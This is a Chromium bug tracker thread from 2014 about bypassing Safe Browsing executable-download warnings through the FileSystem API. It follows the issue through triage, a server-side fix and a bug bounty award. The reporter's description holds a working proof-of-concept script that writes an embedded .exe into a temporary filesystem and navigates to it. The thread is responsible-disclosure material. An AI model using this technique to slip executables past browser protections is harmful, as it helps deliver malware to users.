# Security: Safe Browsing for Executable Files can be bypassed by using the FileSystem API

| Field | Value |
|-------|-------|
| **Issue ID** | [40079669](https://issues.chromium.org/issues/40079669) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Storage>FileSystem, UI>Browser>Downloads |
| **Reporter** | vi...@gmail.com |
| **Assignee** | as...@chromium.org |
| **Created** | 2014-06-04 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

Safe Browsing for Executable Files can be bypassed by using the FileSystem API, by creating the .exe file to be downloaded in a temporary filesystem, and then navigating to it. A server-side PHP script in this case builds the javascript byte array, but other techniques could be used here (eg. an XMLHttpRequest returning a Blob.)  

You must not be in Incognito mode for this to work.

**VERSION**  

Chrome Version: 35.0.1916.114 m + stable  

Operating System: Windows XP Home Edition Service Pack 3

**REPRODUCTION CASE**  

Test case available at <https://server2.vittgam.net/testerone123/exedlvuln/vuln.php>

<script>
(function(){
var errorize=function(e){console.log(e);};
var filename='msghello-bypass.exe';
var blob=new Blob([new Uint8Array(<?php echo str\_replace(',',', ',json\_encode(array\_map('ord',str\_split(file\_get\_contents('msghello.exe'))))); ?>)],{type:'application/octet-stream'});
window.webkitRequestFileSystem(window.TEMPORARY,1048576,function(fs){
var createFile=function(){
fs.root.getFile(filename,{create:true,exclusive:true},function(fileEntry){
fileEntry.createWriter(function(writer){
writer.onwriteend=function(){
window.location.href=fileEntry.toURL();
};
writer.onerror=errorize;
writer.write(blob);
},errorize);
},errorize);
};
fs.root.getFile(filename,{create:false},function(fileEntry){
fileEntry.remove(createFile,errorize);
},createFile);
},errorize);
})();
</script>

## Attachments

- [Screenshot from 2014-11-19 17:27:06.png](attachments/Screenshot from 2014-11-19 17_27_06.png) (image/png, 152.3 KB)

## Timeline

### vi...@gmail.com (2014-06-04)

I forgot to say, the expected behaviour for the FileSystem API download (as well as the current behaviour for the direct link to the .exe file) is to block the download because "file.exe is not commonly downloaded and could be dangerous."

### pa...@google.com (2014-06-04)

Thanks for your report!

Do we know if this would work for known-malicious files as well as "not commonly downloaded" ones? I assume so, but don't know for sure. (I don't have a Windows machine or a piece of malware handy at the moment.)

asanka, can you take this or find someone who can?

### er...@chromium.org (2014-06-06)

We should be treating filesystem:http(s) URLs the same as we'd treat http(s) urls in the same origin.  We're probably just missing a scheme somewhere in the Safe Browsing code.

### as...@chromium.org (2014-06-06)

This isn't an issue with filesystem URLs in general. The SafeBrowsing ping that resulted from the filesystem URL ended up receiving a HTTP 400 response.

Not all filesystem URLs trigger this issue. I'm trying to follow up with the SafeBrowsing team on why the server is rejecting this specific ping.

The SB failure shouldn't result in the download being considered safe. That's https://crbug.com/chromium/269157.

### pa...@chromium.org (2014-06-06)

[Empty comment from Monorail migration]

### vi...@gmail.com (2014-06-07)

If you need an HTTP test page it is at http://testerone123.server2.vittgam.net/exedlvuln/vuln.php

Maybe the problem is that filesystem:https goes 400 but filesystem:http does not?

(I haven't access to a Windows machine now to test this theory...)

### as...@chromium.org (2014-06-10)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-06-19)

asanka@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### as...@chromium.org (2014-06-19)

This is being followed up with the SafeBrowsing folks.

### ti...@chromium.org (2014-06-24)

Hey Asanka - any progress with SafeBrowsing? Is there any more context in addition to that on the blocking https://crbug.com/chromium/269157?

### as...@chromium.org (2014-06-25)

#10: b/14389394


### ti...@chromium.org (2014-06-25)

Thanks Asanka!

### mb...@chromium.org (2014-07-11)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-07-30)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-08-01)

[Empty comment from Monorail migration]

### cb...@chromium.org (2014-09-24)

asanka: What's the progress of this bug? Hasn't been updated in a while.

### as...@chromium.org (2014-09-24)

Since https://crbug.com/chromium/269157 was resolved, the HTTP 400 error from SB now results in the old dangerous file download warning rather than no warning at all. This is slightly better, but not quite there yet.

### cl...@chromium.org (2014-09-29)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-11-08)

[Empty comment from Monorail migration]

### lg...@chromium.org (2014-11-20)

Both buttons in the demo give the same warning now.

### in...@chromium.org (2015-01-07)

What is the status on this ? Please add WIP label back if you are actively looking into this.

### in...@chromium.org (2015-01-07)

No more M39 patches, moving to M40.

### cl...@chromium.org (2015-01-07)

asanka@: Uh oh! This issue is still open and hasn't been updated in the last 48 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### as...@chromium.org (2015-01-07)

This has been resolved server side.

### cl...@chromium.org (2015-01-07)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

Your fix is very close to the branch point. After the branch happens, please make sure to check if your fix is in.

- Your friendly ClusterFuzz

### as...@chromium.org (2015-01-07)

No merge necessary. The blocker https://crbug.com/chromium/269157 was fixed prior to M-39.

### in...@chromium.org (2015-01-25)

[Empty comment from Monorail migration]

### ti...@google.com (2015-02-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-04-14)

After a long wait, we finally got this one through our reward panel and decided to award you $500 for your report.

Someone from our finance area should be in contact in two weeks to collect payment details. Please contact me directly if this doesn't happen.

We'll credit you in our release notes as "vittgam" (note that although this was fixed in an earlier release, we'll put this in with our M42 release notes). Please let me know if you'd like to use another name or handle.

Cheers,
Tim


*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### vi...@gmail.com (2015-04-14)

Hello Tim,

Many thanks for the reward! It's really appreciated. :)

I'd like to be credited as "Vittorio Gambaletta (VittGam)", if possible.

Thanks again!

Cheers,
Vittorio G

### ti...@google.com (2015-04-14)

All done - we'll credit you as "Vittorio Gambaletta (VittGam)" in our release notes. Thanks again!

### cl...@chromium.org (2015-04-15)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-05-06)

[Empty comment from Monorail migration]

### vi...@gmail.com (2015-05-07)

Hello Tim,

I was not contacted by anyone regarding this matter. And I cannot either contact you directly, since your email address is not fully readable as per https://code.google.com/p/support/issues/detail?id=34126 .

What should I do?


Best,
Vittorio G

### ti...@google.com (2015-05-07)

Hey Vittorio,

If you haven't heard anything in 24 hours, email me at timwillis@

Thanks,
Tim

### ti...@google.com (2015-06-25)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### ti...@google.com (2015-07-24)

Note: sorry for the delay in payment here - it turns out in the new payment system, these payments were waiting for a second approval from me. I've just approved, so it should be 1-2 weeks from today to receive payment.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/380663?no_tracker_redirect=1

[Multiple monorail components: Blink>Storage>FileSystem, UI>Browser>Downloads, UI>Browser>SafeBrowsing]
[Monorail blocked-on: crbug.com/chromium/269157]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40079669)*
